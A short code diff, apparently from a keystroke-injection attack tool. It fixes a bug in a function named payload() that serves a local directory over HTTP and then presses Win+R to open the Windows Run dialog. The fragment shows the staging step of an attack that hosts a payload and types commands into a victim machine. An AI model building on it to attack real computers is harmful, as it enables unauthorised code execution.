@@ -37,7 +37,7 @@ def payload():
 	os.chdir(web_dir)
 	httpHandler = http.server.SimpleHTTPRequestHandler
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
-	httplistener=Process(target=httpd.serve_forever())
+	httplistener=Process(target=httpd.serve_forever)
 	httplistener.start()
 	sleep(3)
 	eco.press("LGUI+R")
